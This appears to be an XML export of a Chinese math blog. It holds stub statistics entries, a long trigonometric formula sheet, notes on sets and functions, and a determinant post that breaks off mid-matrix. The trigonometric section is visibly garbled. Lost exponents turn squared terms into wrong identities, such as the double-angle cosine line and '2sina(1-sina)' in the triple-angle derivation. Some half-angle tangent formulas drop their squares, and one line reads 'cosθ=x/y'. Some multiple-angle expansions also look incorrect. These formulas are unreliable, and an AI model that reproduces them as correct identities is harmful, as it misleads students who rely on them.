    <url>/2018/08/04/%E6%95%B0%E5%AD%A6/%E7%BB%9F%E8%AE%A1%E5%AD%A6%E5%8D%81%E4%B9%8B%E9%9A%90%E9%A9%AC%E5%B0%94%E5%8F%AF%E5%A4%AB%E6%A8%A1%E5%9E%8B/</url>
    <content><![CDATA[<h1 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h1><blockquote>
<ul>
<li>统计学习方法(李航)</li>
</ul>
</blockquote>
]]></content>
      <categories>
        <category>数学</category>
      </categories>
      <tags>
        <tag>统计学</tag>
      </tags>
  </entry>
  <entry>
    <title>三角函数常用公式</title>
    <url>/2017/11/10/%E6%95%B0%E5%AD%A6/%E4%B8%89%E8%A7%92%E5%87%BD%E6%95%B0%E5%85%AC%E5%BC%8F/</url>
    <content><![CDATA[<p>1.诱导公式</p>
<p>sin(-a) = - sin(a) </p>
<p>cos(-a) = cos(a)</p>
<p>sin(π/2 - a) = cos(a)</p>
<p>cos(π/2 - a) = sin(a)</p>
<p>sin(π/2 + a) = cos(a)</p>
<p>cos(π/2 + a) = - sin(a)</p>
<p>sin(π - a) = sin(a)</p>
<p>cos(π - a) = - cos(a)</p>
<p>sin(π + a) = - sin(a)</p>
<p>cos(π + a) = - cos(a)</p>
<p>2.两角和与差的三角函数</p>
<p>sin(a + b) = sin(a)cos(b) + cos(α)sin(b)</p>
<p>cos(a + b) = cos(a)cos(b) - sin(a)sin(b)</p>
<p>sin(a - b) = sin(a)cos(b) - cos(a)sin(b)</p>
<p>cos(a - b) = cos(a)cos(b) + sin(a)sin(b)</p>
<p>tan(a + b) = [tan(a) + tan(b)] / [1 - tan(a)tan(b)]</p>
<p>tan(a - b) = [tan(a) - tan(b)] / [1 + tan(a)tan(b)]</p>
<p>3.和差化积公式 </p>
<p>sin(a) + sin(b) = 2sin[(a + b)/2]cos[(a - b)/2]</p>
<p>sin(a) - sin(b) = 2sin[(a - b)/2]cos[(a + b)/2] </p>
<p>cos(a) + cos(b) = 2cos[(a + b)/2]cos[(a - b)/2] </p>
<p>cos(a) - cos(b) = - 2sin[(a + b)/2]sin[(a - b)/2] </p>
<p>4.积化和差公式 </p>
<p>sin(a)sin(b) = - 1/2[cos(a + b) - cos(a - b)]</p>
<p>cos(a)cos(b) = 1/2[cos(a + b) + cos(a -b)]</p>
<p>sin(a)cos(b) = 1/2[sin(a + b) + sin(a - b)]</p>
<p>5.二倍角公式 </p>
<p>sin(2a) = 2sin(a)cos(a)</p>
<p>cos 2a = cos2a - sin2a = 2cos2a - 1= 1 - 2sin2a</p>
<p>6.半角公式 </p>
<p>sin2a = （1 – cos 2a）/ 2<br>cos2a = （1 + cos 2a）/ 2<br>tan a = [1 – cos 2a] /sin 2a = sin 2a / [1 + cos 2a ]</p>
<p>7.万能公式 </p>
<p>sin(a) = 2tan(a/2) / [1+tan2(a/2)]</p>
<p>cos(a) = [1-tan2(a/2)] / [1+tan2(a/2)]</p>
<p>tan(a) = 2tan(a/2) / [1-tan2(a/2)]<br>三角函数公式<br>求助编辑百科名片<br>三角函数是数学中属于初等函数中的超越函数的一类函数。它们的本质是任何角的集合与一个比值的集合的变量之间的映射。通常的三角函数是在平面直角坐标系中定义的。其定义城为整个实数城。另一种定义是在直角三角形中，但并不完全。现代数学把它们描述成无穷敖列的极限和微分方程的解，将其定义扩展到复数系。<br>目录<br>公式分类 同角三角函数的基本关系 平常针对不同条件的常用的两个公式 一个特殊公式 坡度公式 锐角三角函数公式 二倍角公式<br>三倍角公式 三倍角公式 半角公式 万能公式<br>其他 四倍角公式 五倍角公式<br>六倍角公式 七倍角公式<br>八倍角公式 九倍角公式十倍角公式<br>N倍角公式 半角公式 两角和公式<br>三角和公式 和差化积<br>积化和差 双曲函数 三角函数的诱导公式（六公式）<br>万能公式 其它公式<br>内容规律公式分类 同角三角函数的基本关系 平常针对不同条件的常用的两个公式<br>一个特殊公式 坡度公式<br>锐角三角函数公式 二倍角公式<br>三倍角公式 三倍角公式 半角公式<br>万能公式 其他<br>四倍角公式 五倍角公式 六倍角公式 七倍角公式 八倍角公式 九倍角公式 十倍角公式 N倍角公式 半角公式 两角和公式 三角和公式 和差化积 积化和差<br>双曲函数 三角函数的诱导公式（六公式）<br>万能公式 其它公式内容规律<br>展开<br>编辑本段公式分类<br>同角三角函数的基本关系<br>　　倒数关系：<br>　　tanα ·cotα=1<br>　　sinα ·cscα=1<br>　　cosα·secα=1<br>　　商的关系：　<br>　　sinα/cosα=tanα=secα/cscα<br>　　平方关系： </p>
<p>平常针对不同条件的常用的两个公式</p>
<p>一个特殊公式<br>　　（sina+sinθ）<em>（sina-sinθ）=sin（a+θ）</em>sin（a-θ）<br>　　证明：（sina+sinθ）<em>（sina-sinθ）=2 sin[(θ+a)/2] cos[(a-θ)/2] </em>2 cos[(θ+a)/2] sin[(a-θ)/2]<br>　　=sin（a+θ）*sin（a-θ）<br>坡度公式<br>　　我们通常把坡面的铅直高度h与水平高度l的比叫做坡度（也叫坡比）， 用字母i表示，<br>　　即 i=h / l,坡度的一般形式写成 l : m形式，如i=1:5.如果把坡面与水平面的夹角记作<br>　　a(叫做坡角），那么 i=h/l=tan a.<br>锐角三角函数公式<br>　　正弦： sinα=∠α的对边/∠α 的斜边<br>　　余弦：cosα=∠α的邻边/∠α的斜边<br>　　正切：tanα=∠α的对边/∠α的邻边<br>　　余切：cotα=∠α的邻边/∠α的对边<br>二倍角公式<br>　　正弦<br>　　sin2A=2sinA·cosA<br>　　余弦 
　　 </p>
<p>正切<br>　　tan2A=（2tanA）/（1-tan^2(A)）<br>三倍角公式</p>
<p>三倍角公式<br>　　sin3α=4sinα·sin(π/3+α)sin(π/3-α)<br>　　cos3α=4cosα·cos(π/3+α)cos(π/3-α)<br>　　tan3a = tan a · tan(π/3+a)· tan(π/3-a)<br>　　三倍角公式推导　<br>　　sin(3a)<br>　　=sin(a+2a)<br>　　=sin2acosa+cos2asina<br>　　=2sina(1-sina)+(1-2sina)sina<br>　　=3sina-4sin^3a<br>　　cos3a<br>　　=cos(2a+a)<br>　　=cos2acosa-sin2asina<br>　　=(2cosa-1)cosa-2(1-cos^a)cosa<br>　　=4cos^3a-3cosa<br>　　sin3a=3sina-4sin^3a<br>　　=4sina(3/4-sina)<br>　　=4sina[(√3/2)-sina]<br>　　=4sina(sin60°-sina)<br>　　=4sina(sin60°+sina)(sin60°-sina)<br>　　=4sina<em>2sin[(60+a)/2]cos[(60°-a)/2]</em>2sin[(60°-a)/2]cos[(60°-a)/2]<br>　　=4sinasin(60°+a)sin(60°-a)<br>　　cos3a=4cos^3a-3cosa<br>　　=4cosa(cosa-3/4)<br>　　=4cosa[cosa-(√3/2)^2]<br>　　=4cosa(cosa-cos30°)<br>　　=4cosa(cosa+cos30°)(cosa-cos30°)<br>　　=4cosa<em>2cos[(a+30°)/2]cos[(a-30°)/2]</em>{-2sin[(a+30°)/2]sin[(a-30°)/2]}<br>　　=-4cosasin(a+30°)sin(a-30°)<br>　　=-4cosasin[90°-(60°-a)]sin[-90°+(60°+a)]<br>　　=-4cosacos(60°-a)[-cos(60°+a)]<br>　　=4cosacos(60°-a)cos(60°+a)<br>　　上述两式相比可得<br>　　tan3a=tanatan(60°-a)tan(60°+a)<br>　　现列出公式如下：　<br>　　sin2α=2sinαcosα tan2α=2tanα/(1-tanα ） cos2α=cosα-sinα=2cosα-1=1-2sinα　<br>　　可别轻视这些字符，它们在数学学习中会起到重要作用，包括在一些图像问题和函数问题中<br>三倍角公式<br>　　sin3α=3sinα-4sinα=4sinα·sin(π/3+α)sin(π/3-α) cos3α=4cosα-3cosα=4cosα·cos(π/3+α)cos(π/3-α) tan3α=tan(α)<em>(-3+tan(α)^2)/(-1+3</em>tan(α)^2)=tan a · tan(π/3+a)· tan(π/3-a)<br>半角公式<br>　　sin^2(α/2)=(1-cosα)/2<br>　　cos^2(α/2)=(1+cosα)/2<br>　　tan^2(α/2)=(1-cosα)/(1+cosα)<br>　　tan(α/2)=sinα/(1+cosα)=(1-cosα)/sinα<br>万能公式<br>　　sinα=2tan(α/2)/[1+tan(α/2)]<br>　　cosα=[1-tan(α/2)]/[1+tan^2(α/2)]<br>　　tanα=2tan(α/2)/[1-tan&amp;s(α/2)]<br>其他<br>　　sinα+sin(α+2π/n)+sin(α+2π<em>2/n)+sin(α+2π</em>3/n)+……+sin[α+2π<em>(n-1)/n]=0<br>　　cosα+cos(α+2π/n)+cos(α+2π</em>2/n)+cos(α+2π<em>3/n)+……+cos[α+2π</em>(n-1)/n]=0 以及<br>　　sin^2(α)+sin^2(α-2π/3)+sin^2(α+2π/3)=3/2<br>　　tanAtanBtan(A+B)+tanA+tanB-tan(A+B)=0<br>四倍角公式<br>　　sin4A=-4<em>(cosA</em>sinA<em>(2</em>sinA^2-1))<br>　　cos4A=1+(-8<em>cosA^2+8</em>cosA^4)<br>　　tan4A=(4<em>tanA-4</em>tanA^3)/(1-6<em>tanA^2+tanA^4)<br>五倍角公式<br>　　sin5A=16sinA^5-20sinA^3+5sinA cos5A=16cosA^5-20cosA^3+5cosA tan5A=tanA</em>(5-10<em>tanA^2+tanA^4)/(1-10</em>tanA^2+5<em>tanA^4)<br>六倍角公式<br>　　sin6A=2</em>(cosA<em>sinA</em>(2<em>sinA+1)</em>(2<em>sinA-1)</em>(-3+4<em>sinA^2))<br>　　cos6A=((-1+2</em>cosA)<em>(16</em>cosA^4-16<em>cosA^2+1))<br>　　tan6A=(-6</em>tanA+20<em>tanA^3-6</em>tanA^5)/(-1+15<em>tanA-15</em>tanA^4+tanA^6)<br>七倍角公式<br>　　sin7A=-(sinA<em>(56</em>sinA^2-112<em>sinA^4-7+64</em>sinA^6))<br>　　cos7A=(cosA<em>(56</em>cosA^2-112<em>cosA^4+64</em>cosA^6-7))<br>　　tan7A=tanA<em>(-7+35</em>tanA^2-21<em>tanA^4+tanA^6)/(-1+21</em>tanA^2-35<em>tanA^4+7</em>tanA^6)<br>八倍角公式<br>　　sin8A=-8<em>(cosA</em>sinA<em>(2</em>sinA^2-1)<em>(-8</em>sinA^2+8<em>sinA^4+1)) cos8A=1+(160</em>cosA^4-256<em>cosA^6+128</em>cosA^8-32<em>cosA^2) tan8A=-8</em>tanA<em>(-1+7</em>tanA^2-7<em>tanA^4+tanA^6)/(1-28</em>tanA^2+70<em>tanA^4-28</em>tanA^6+tanA^8)<br>九倍角公式<br>　　sin9A=(sinA<em>(-3+4</em>sinA^2)<em>(64</em>sinA^6-96<em>sinA^4+36</em>sinA^2-3)) cos9A=(cosA<em>(-3+4</em>cosA^2)<em>(64</em>cosA^6-96<em>cosA^4+36</em>cosA^2-3)) tan9A=tanA<em>(9-84</em>tanA^2+126<em>tanA^4-36</em>tanA^6+tanA^8)/(1-36<em>tanA^2+126</em>tanA^4-84<em>tanA^6+9</em>tanA^8)<br>十倍角公式<br>　　sin10A = 2<em>(cosA</em>sinA<em>(4</em>sinA^2+2<em>sinA-1)</em>(4<em>sinA^2-2</em>sinA-1)<em>(-20</em>sinA^2+5+16<em>sinA^4))<br>　　cos10A = ((-1+2</em>cosA^2)<em>(256</em>cosA^8-512<em>cosA^6+304</em>cosA^4-48<em>cosA^2+1))<br>　　tan10A = -2</em>tanA<em>(5-60</em>tanA^2+126<em>tanA^4-60</em>tanA^6+5<em>tanA^8)/(-1+45</em>tanA^2-210<em>tanA^4+210</em>tanA^6-45<em>tanA^8+tanA^10)<br>N倍角公式<br>　　根据棣美弗定理，(cosθ+ i sinθ)^n = cos(nθ)+ i sin(nθ)<br>　　为方便描述，令sinθ=s，cosθ=c<br>　　考虑n为正整数的情形：<br>　　cos(nθ)+ i sin(nθ) = (c+ i s)^n = C(n,0)</em>c^n + C(n,2)<em>c^(n-2)</em>(i s)^2 + C(n,4)<em>c^(n- 4)</em>(i s)^4 + … …+C(n,1)<em>c^(n-1)</em>(i s)^1 + C(n,3)<em>c^(n-3)</em>(i s)^3 + C(n,5)<em>c^(n-5)</em>(i s)^5 + … …=&gt;比较两边的实部与虚部<br>　　实部：cos(nθ)=C(n,0)<em>c^n + C(n,2)</em>c^(n-2)<em>(i s)^2 + C(n,4)</em>c^(n-4)<em>(i s)^4 + … …i</em><br>　　(虚部)：i<em>sin(nθ)=C(n,1)</em>c^(n-1)<em>(i s)^1 + C(n,3)</em>c^(n-3)<em>(i s)^3 + C(n,5)</em>c^(n-5)<em>(i s)^5 + … …　<br>　　对所有的自然数n：<br>　　1. cos(nθ)：<br>　　公式中出现的s都是偶次方，而s^2=1-c^2(平方关系)，因此全部都可以改成以c(也就是cosθ)表示。<br>　　2. sin(nθ)：<br>　　(1)当n是奇数时：公式中出现的c都是偶次方，而c^2=1-s^2(平方关系)，因此全部都可以改成以s(也 就是sinθ)表示。<br>　　(2)当n是偶数时：公式中出现的c都是奇次方，而c^2=1-s^2(平方关系)，因此即使再怎么换成s，都至少会剩c(也就是 cosθ)的一次方无法消掉。<br>　　(例. c^3=c</em>c^2=c<em>(1-s^2)，c^5=c</em>(c^2)^2=c*(1-s^2)^2)<br>半角公式<br>　　tan(A/2)=(1-cosA)/sinA=sinA/(1+cosA)<br>　　sin^2(a/2)=(1-cos(a))/2<br>　　cos^2(a/2)=(1+cos(a))/2<br>　　tan(a/2)=(1-cos(a))/sin(a)=sin(a)/(1+cos(a)) </p>
<p>半角公式<br>两角和公式</p>
<p>两角和公式<br>　　cos(α+β)=cosαcosβ-sinαsinβ<br>　　cos(α-β)=cosαcosβ+sinαsinβ<br>　　sin(α+β)=sinαcosβ+cosαsinβ<br>　　sin(α-β)=sinαcosβ -cosαsinβ<br>　　tan(α+β)=(tanα+tanβ)/(1-tanαtanβ)<br>　　tan(α-β)=(tanα-tanβ)/(1+tanαtanβ)<br>　　cot(A+B) = (cotAcotB-1)/(cotB+cotA)<br>　　cot(A-B) = (cotAcotB+1)/(cotB-cotA)<br>三角和公式<br>　　sin(α+β+γ)=sinα·cosβ·cosγ+cosα·sinβ·cosγ+cosα·cosβ·sinγ-sinα·sinβ·sinγ<br>　　cos(α+β+γ)=cosα·cosβ·cosγ-cosα·sinβ·sinγ-sinα·cosβ·sinγ-sinα·sinβ·cosγ<br>　　tan(α+β+γ)=(tanα+tanβ+tanγ-tanα·tanβ·tanγ)/(1-tanα·tanβ-tanβ·tanγ-tanγ·tanα)<br>和差化积<br>　　sinθ+sinφ =2sin[(θ+φ)/2] cos[(θ-φ)/2] </p>
<p>和差化积公式<br>sinθ-sinφ=2cos[(θ+φ)/2] sin[(θ-φ)/2]<br>　　cosθ+cosφ=2cos[(θ+φ)/2]cos[(θ-φ)/2]<br>　　cosθ-cosφ= -2sin[(θ+φ)/2]sin[(θ-φ)/2]<br>　　tanA+tanB=sin(A+B)/cosAcosB=tan(A+B)(1-tanAtanB)<br>　　tanA-tanB=sin(A-B)/cosAcosB=tan(A-B)(1+tanAtanB)<br>积化和差<br>　　sinαsinβ=-[cos(α+β)-cos(α-β)] /2<br>　　cosαcosβ=[cos(α+β)+cos(α-β)]/2<br>　　sinαcosβ=[sin(α+β)+sin(α-β)]/2<br>　　cosαsinβ=[sin(α+β)-sin(α-β)]/2<br>双曲函数<br>　　sh a = [e^a-e^(-a)]/2<br>　　ch a = [e^a+e^(-a)]/2<br>　　th a = sin h(a)/cos h(a)<br>　　公式一：<br>　　设α为任意角，终边相同的角的同一三角函数的值相等：<br>　　sin（2kπ+α）= sinα<br>　　cos（2kπ+α）= cosα<br>　　tan（2kπ+α）= tanα<br>　　cot（2kπ+α）= cotα<br>　　公式二：<br>　　设α为任意角，π+α的三角函数值与α的三角函数值之间的关系：<br>　　sin（π+α）= -sinα<br>　　cos（π+α）= -cosα<br>　　tan（π+α）= tanα<br>　　cot（π+α）= cotα<br>　　公式三：<br>　　任意角α与 -α的三角函数值之间的关系：<br>　　sin（-α）= -sinα<br>　　cos（-α）= cosα<br>　　tan（-α）= -tanα<br>　　cot（-α）= -cotα<br>　　公式四：<br>　　利用公式二和公式三可以得到π-α与α的三角函数值之间的关系：<br>　　sin（π-α）= sinα<br>　　cos（π-α）= -cosα<br>　　tan（π-α）= -tanα<br>　　cot（π-α）= -cotα<br>　　公式五：<br>　　利用公式-和公式三可以得到2π-α与α的三角函数值之间的关系：<br>　　sin（2π-α）= -sinα<br>　　cos（2π-α）= cosα<br>　　tan（2π-α）= -tanα<br>　　cot（2π-α）= -cotα<br>　　公式六：<br>　　π/2±α及3π/2±α与α的三角函数值之间的关系：<br>　　sin（π/2+α）= cosα<br>　　cos（π/2+α）= -sinα<br>　　tan（π/2+α）= -cotα<br>　　cot（π/2+α）= -tanα<br>　　sin（π/2-α）= cosα<br>　　cos（π/2-α）= sinα<br>　　tan（π/2-α）= cotα<br>　　cot（π/2-α）= tanα<br>　　sin（3π/2+α）= -cosα<br>　　cos（3π/2+α）= sinα<br>　　tan（3π/2+α）= -cotα<br>　　cot（3π/2+α）= -tanα<br>　　sin（3π/2-α）= -cosα<br>　　cos（3π/2-α）= -sinα<br>　　tan（3π/2-α）= cotα<br>　　cot（3π/2-α）= tanα<br>　　(以上k∈Z)<br>　　A·sin(ωt+θ)+ B·sin(ωt+φ) =<br>　　√{(A+2ABcos(θ-φ)} · sin{ωt + arcsin[ (A·sinθ+B·sinφ) / √{A^2 +B^2 +2ABcos(θ-φ)} }<br>　　√表示根号,包括{……}中的内容<br>三角函数的诱导公式（六公式）<br>　　公式一：　<br>　　sin(-α) = -sinα<br>　　cos(-α) = cosα<br>　　tan (-α)=-tanα<br>　　公式二：<br>　　sin(π/2-α) = cosα<br>　　cos(π/2-α) = sinα<br>　　公式三：<br>　　sin(π/2+α) = cosα<br>　　cos(π/2+α) = -sinα<br>　　公式四：<br>　　sin(π-α) = sinα<br>　　cos(π-α) = -cosα<br>　　公式五：<br>　　sin(π+α) = -sinα<br>　　cos(π+α) = -cosα<br>　　公式六：<br>　　tanA= sinA/cosA<br>　　tan（π/2+α）=－cotα<br>　　tan（π/2－α）=cotα<br>　　tan（π－α）=－tanα<br>　　tan（π+α）=tanα<br>　　诱导公式 记背诀窍：奇变偶不变，符号看象限<br>万能公式</p>
<p>万能公式<br>　　sinα=2tan(α/2)/[1+(tan(α/2))]<br>　　cosα=[1-(tan(α/2))]/[1+(tan(α/2)]<br>　　tanα=2tan(α/2)/[1-(tan(α/2))]<br>其它公式</p>
<p>三角函数其它公式<br>　　(1) (sinα)^2+(cosα)^2=1（平方和公式）<br>　　(2)1+(tanα)^2=(secα)^2<br>　　(3)1+(cotα)^2=(cscα)^2<br>　　证明下面两式，只需将一式,左右同除(sinα)^2，第二个除(cosα)^2即可<br>　　(4)对于任意非直角三角形，总有<br>　　tanA+tanB+tanC=tanAtanBtanC<br>　　证：<br>　　A+B=π-C<br>　　tan(A+B)=tan(π-C)<br>　　(tanA+tanB)/(1-tanAtanB)=(tanπ-tanC)/(1+tanπtanC)<br>　　整理可得<br>　　tanA+tanB+tanC=tanAtanBtanC<br>　　得证<br>　　同样可以得证,当x+y+z=nπ(n∈Z)时，该关系式也成立<br>　　由tanA+tanB+tanC=tanAtanBtanC可得出以下结论<br>　　(5)cotAcotB+cotAcotC+cotBcotC=1<br>　　(6)cot(A/2)+cot(B/2)+cot(C/2)=cot(A/2)cot(B/2)cot(C/2)<br>　　(7)(cosA)^2+(cosB)^2+(cosC)^2=1-2cosAcosBcosC<br>　　(8)（sinA)^2+(sinB)^2+(sinC)^2=2+2cosAcosBcosC<br>　　其他非重点三角函数　<br>　　csc(a) = 1/sin(a)<br>　　sec(a) = 1/cos(a)<br>　　(seca)^2+(csca)^2=(seca)^2(csca)^2<br>　　幂级数展开式<br>　　sin x = x-x^3/3!+x^5/5!-……+(-1)^(k-1)<em>(x^(2k-1))/(2k-1)!+…… x∈ R<br>　　cos x = 1-x^2/2!+x^4/4!-……+(-1)k</em>(x^(2k))/(2k)!+…… x∈ R<br>　　arcsin x = x + 1/2<em>x^3/3 + 1</em>3/(2<em>4)</em>x^5/5 + ……(|x|&lt;1)<br>　　arccos x = π - ( x + 1/2<em>x^3/3 + 1</em>3/(2<em>4)</em>x^5/5 + …… ) (|x|&lt;1)<br>　　arctan x = x - x^3/3 + x^5/5 -…… (x≤1)<br>　　无限公式<br>　　sinx=x(1-x^2/π^2)(1-x^2/4π^2)(1-x^2/9π^2)……<br>　　cosx=(1-4x^2/π^2)(1-4x^2/9π^2)(1-4x^2/25π^2)……<br>　　tanx=8x[1/(π^2-4x^2)+1/(9π^2-4x^2)+1/(25π^2-4x^2)+……]<br>　　secx=4π[1/(π^2-4x^2)-1/(9π^2-4x^2)+1/(25π^2-4x^2)-+……]<br>　　(sinx)x=cosx/2cosx/4cosx/8……<br>　　(1/4)tanπ/4+(1/8)tanπ/8+(1/16)tanπ/16+……=1/π<br>　　arctan x = x - x^3/3 + x^5/5 -…… (x≤1)<br>　　和自变量数列求和有关的公式<br>　　sinx+sin2x+sin3x+……+sinnx=[sin(nx/2)sin((n+1)x/2)]/sin(x/2)<br>　　cosx+cos2x+cos3x+……+cosnx=[cos((n+1)x/2)sin(nx/2)]/sin(x/2)<br>　　tan((n+1)x/2)=(sinx+sin2x+sin3x+……+sinnx)/(cosx+cos2x+cos3x+……+cosnx)<br>　　sinx+sin3x+sin5x+……+sin(2n-1)x=(sinnx)^2/sinx<br>　　cosx+cos3x+cos5x+……+cos(2n-1)x=sin(2nx)/(2sinx)<br>编辑本段内容规律<br>　　三角函数看似很多，很复杂，但只要掌握了三角函数的本质及内部规律就会发现三角函数各个公式之间有强大的联系。而掌握三角函数的内部规律及本质也是学好三角函数的关键所在。<br>　　三角函数本质： </p>
<p>根据三角函数定义推导公式<br>　　根据右图，有<br>　　sinθ=y/ r; cosθ=x/r; tanθ=y/x; cosθ=x/y<br>　　深刻理解了这一点，下面所有的三角公式都可以从这里出发推导出来，比如以推导<br>　　sin(A+B) = sinAcosB+cosAsinB 为例：<br>　　推导：<br>　　首先画单位圆交X轴于C，D，在单位圆上有任意A，B点。角AOD为α，BOD为β，旋转AOB使OB与OD重合，形成新A’OD。<br>　　A(cosα,sinα),B(cosβ，sinβ),A’(cos(α-β),sin(α-β))<br>　　OA’=OA=OB=OD=1,D(1,0)<br>　　∴[cos(α-β)-1]^2+[sin(α-β)]^2=(cosα-cosβ)^2+(sinα-sinβ)^2<br>　　和差化积及积化和差用还原法结合上面公式可推出（换(a+b)/2与(a-b)/2）<br>　　单位圆定义<br>　　单位圆<br>　　六个三角函数也可以依据半径为一中心为原点的单位圆来定义。单位圆定义在实际计算上没有大的价值；实际上对多数角它都依赖于直角三角形。但是单位圆定义的确允许三角函数对所有正数和负数辐角都有定义，而不只是对于在 0 和 π/2 弧度之间的角。它也提供了一个图象，把所有重要的三角函数都包含了。根据勾股定理，单位圆的等式是：<br>　　图象中给出了用弧度度量的一些常见的角。逆时针方向的度量是正角，而顺时针的度量是负角。设一个过原点的线，同 x轴正半部分得到一个角 θ，并与单位圆相交。这个交点的 x和 y坐标分别等于 cos θ和 sin θ。图象中的三角形确保了这个公式；半径等于斜边且长度为1，所以有 sin θ= y/1 和 cos θ= x/1。单位圆可以被视为是通过改变邻边和对边的长度，但保持斜边等于 1的一种查看无限个三角形的方式。</p>
]]></content>
      <categories>
        <category>数学</category>
      </categories>
      <tags>
        <tag>数学</tag>
      </tags>
  </entry>
  <entry>
    <title>统计学六之逻辑斯谛回归与最大熵模型</title>
    <url>/2018/08/04/%E6%95%B0%E5%AD%A6/%E7%BB%9F%E8%AE%A1%E5%AD%A6%E5%85%AD%E4%B9%8B%E9%80%BB%E8%BE%91%E6%96%AF%E8%B0%9B%E5%9B%9E%E5%BD%92%E4%B8%8E%E6%9C%80%E5%A4%A7%E7%86%B5%E6%A8%A1%E5%9E%8B/</url>
    <content><![CDATA[<h1 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h1><blockquote>
<ul>
<li>统计学习方法(李航)</li>
</ul>
</blockquote>
]]></content>
      <categories>
        <category>数学</category>
      </categories>
      <tags>
        <tag>统计学</tag>
      </tags>
  </entry>
  <entry>
    <title>统计学四之朴素贝叶斯法</title>
    <url>/2018/08/04/%E6%95%B0%E5%AD%A6/%E7%BB%9F%E8%AE%A1%E5%AD%A6%E5%9B%9B%E4%B9%8B%E6%9C%B4%E7%B4%A0%E8%B4%9D%E5%8F%B6%E6%96%AF%E6%B3%95/</url>
    <content><![CDATA[<h1 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h1><blockquote>
<ul>
<li>统计学习方法(李航)</li>
</ul>
</blockquote>
]]></content>
      <categories>
        <category>数学</category>
      </categories>
      <tags>
        <tag>统计学</tag>
      </tags>
  </entry>
  <entry>
    <title>高数(一) 函数与极限</title>
    <url>/2017/11/08/%E6%95%B0%E5%AD%A6/%E9%AB%98%E6%95%B0(%E4%B8%80)%E5%87%BD%E6%95%B0%E4%B8%8E%E6%9E%81%E9%99%90/</url>
    <content><![CDATA[<blockquote>
<p>一、映射与函数</p>
</blockquote>
<p>集合是指具有某种特定性质的事物的总体,组成这个集合的事物称为该集合的元素。</p>
<p>我们通常用大字拉丁字母A、B、C、„„表示集合，用小写拉丁字母a、b、c„„表示集合中的元素。如果a是集合A中的元素，就说a属于A，记作：a∈A，否则就说a不属于A，记作：aA。  ⑴、全体非负整数组成的集合叫做非负整数集（或自然数集）。记作N ⑵、所有正整数组成的集合叫做正整数集。记作N+或N+。<br>⑶、全体整数组成的集合叫做整数集。记作Z。<br>⑷、全体有理数组成的集合叫做有理数集。记作Q。<br>⑸、全体实数组成的集合叫做实数集。记作R。</p>
<p><strong>集合的表示方法</strong><br>⑴、列举法：把集合的元素一一列举出来，并用“｛｝”括起来表示集合 。</p>
<script type="math/tex; mode=display">M = \{1,3,4,5,4\}</script><p>⑵、描述法：用集合所有元素的共同特征来表示集合。 </p>
<script type="math/tex; mode=display">P = \{x|x^2-6=0\}</script><p><strong>集合间的基本关系</strong></p>
<p>⑴、子集：一般地，对于两个集合A、B，如果集合A中的任意一个元素都是集合B的元素，我们就说A、B有包含关系，称集合A为集合B的子集，记作<script type="math/tex">A\subset  或 B\supset A</script></p>
<p>⑵相等：如何集合A是集合B的子集，且集合B是集合A的子集，此时集合A中的元素与集合B中的元素完全一样，因此集合A与集合B相等，记作A＝B。 </p>
<p>⑶、真子集：如何集合A是集合B的子集，但存在一个元素属于B但不属于A，我们称集合A是集合B的真子集， </p>
<p>⑷、空集：我们把不含任何元素的集合叫做空集。记作  <script type="math/tex">\phi</script>,   并规定空集是任何集合的子集。</p>
<p>⑸、由上述集合之间的基本关系,可以得到下面的结论： </p>
<p>①、任何一个集合是它本身的子集。即<script type="math/tex">A\subseteq A</script>。</p>
<p>②、对于集合A、B、C，如果A是B的子集，B是C的子集，则A是C的子集。</p>
<p>③、我们可以把相等的集合叫做“等集”，这样的话子集包括“真子集”和“等集”。</p>
]]></content>
      <categories>
        <category>数学</category>
      </categories>
      <tags>
        <tag>数学</tag>
      </tags>
  </entry>
  <entry>
    <title>线性代数一之行列式</title>
    <url>/2018/07/12/%E6%95%B0%E5%AD%A6/%E7%BA%BF%E6%80%A7%E4%BB%A3%E6%95%B0%E4%B8%80%E4%B9%8B%E8%A1%8C%E5%88%97%E5%BC%8F/</url>
    <content><![CDATA[<p>行列式（Determinant）是数学中的一个函数，将一个n <script type="math/tex">\times</script> n的矩阵A映射到一个标量，记作 det(A)或 |A|。行列式可以看做是有向面积或体积的概念在一般的欧几里得空间中的推广。或者说，在 n 维欧几里得空间中，行列式描述的是一个线性变换对“体积”所造成的影响。无论是在线性代数、多项式理论，还是在微积分学中（比如说换元积分法中），行列式作为基本的数学工具，都有着重要的应用。</p>
<p>行列式概念最早出现在解线性方程组的过程中。十七世纪晚期，关孝和与莱布尼茨的著作中已经使用行列式来确定线性方程组解的个数以及形式。十八世纪开始，行列式开始作为独立的数学概念被研究。十九世纪以后，行列式理论进一步得到发展和完善。矩阵概念的引入使得更多有关行列式的性质被发现，行列式在许多领域都逐渐显现出重要的意义和作用，出现线性自同态和向量组的行列式的定义。</p>
<p>行列式的特性可以被概括为一个交替多线性形式，这个本质使得行列式在欧几里德空间中可以成为描述“体积”的函数。 — wiki</p>
<blockquote>
<h1 id="二阶与三阶行列式"><a href="#二阶与三阶行列式" class="headerlink" title="二阶与三阶行列式"></a>二阶与三阶行列式</h1><h2 id="解方程组"><a href="#解方程组" class="headerlink" title="解方程组"></a>解方程组</h2></blockquote>
<script type="math/tex; mode=display">
\begin{cases}
a_{11}x_1+a_{12}x_2=b_1 \\
a_{21}x_1+a_{22}x_2=b_2 
\end{cases}</script><p>消元法解方程后:</p>
<script type="math/tex; mode=display">
x_1 = \frac {b_1a_{22}-a_{12}b_2 }{a_{11}a_{22}-a_{12}a_{21} }</script><script type="math/tex; mode=display">
x_2 = \frac {b_2a_{11}-a_{21}b_1 }{a_{11}a_{22}-a_{12}a_{21} }</script><p>方程组的系数可以用二行二列的数表表示：</p>
<script type="math/tex; mode=display">
\begin{matrix}
a_{11} & a_{12} \\
a_{21} & a_{22} 
